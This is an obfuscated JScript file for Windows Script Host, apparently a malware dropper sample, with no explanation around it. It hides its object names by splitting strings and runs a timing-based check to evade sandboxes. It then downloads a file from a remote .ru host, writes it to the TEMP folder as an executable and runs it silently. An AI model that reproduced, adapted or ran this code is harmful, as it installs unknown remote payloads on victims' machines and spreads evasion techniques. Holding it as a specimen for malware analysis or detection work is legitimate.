var VD = false;
var E = "Create"+"Object";
var T = function F() {return WScript[E]("WScript"+".Shell");}(), D = 11;
var PJ = "MSXML2"+".XMLHTTP";
var N = 2;
var AW = N - 2;
function H(L){T["Run"](L, AW, AW);};
function SK(){return PJ + "";};
function JI(DG, E0){AW = AW * 1; return DG - E0;};
function JC(){return E;};
/*@cc_on
  @if (@_win32 || @_win64)
    VD = true;
  @end
@*/
if (VD)
{
var F0 = "";
function UV(){return 22;};
var HB = 0; var LE = 0;
function YN()
{
var OJ = new this["Date"]();
var Q = OJ["getUTCMilliseconds"]();
WScript["Sleep"](UV());
var OJ = new this["Date"]();
var W = OJ["getUTCMilliseconds"]();
WScript["Sleep"](UV());
var OJ = new this["Date"]();
var WB = OJ["getUTCMilliseconds"]();
var HB = "X";
HB = JI(W, Q);
var LE = "A";
LE = JI(WB, W);
F0 = "open";
return JI(HB, LE);
}
var CA = false;
var Y = false;
for (var OI = AW; OI < UV() * 1; OI++){if (YN() != AW){
CA = true; 
LE = "31" + 11 * HB + LE; 
Y = true; 
break;
}}
function CB() {return ((CA == true) && (CA == Y)) ? 1 : AW;};
if (CA && CB() && Y){
function NR() {return T["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "9BXaCTi303.ex" + "e";};
 BK = SK();
 O = WScript[E](BK);
 var J = 1;
do { 
	for (;J;){
	try {
		if (J == 1)
		{
			O[F0]("GET", "http://buketrose.ru/h3sia", false);
			O["send"]();
			EH = "Sleep";
			J = 2;
		}
		WScript[EH](UV() + 120); 
		if (O["readystate"] < 2 * 2) continue;
		J = AW;
		function QZ(UX) {var KT = (1, 2, 3, 4, 5, UX); return KT;};
		H0 = WScript[JC()]("ADODB.Stream");
		BK = H0;
		BK[F0]();
		BK["type"] = QZ(1);
		BK["write"](O["ResponseBody"]);
		H0["position"] = QZ(AW);
		BK["Save" + "ToFile"](NR(), 2);
		H0["cl"+"ose"]();
		TR = NR();
		H(TR);
	} catch(PM){};};
}while (J);
}
}

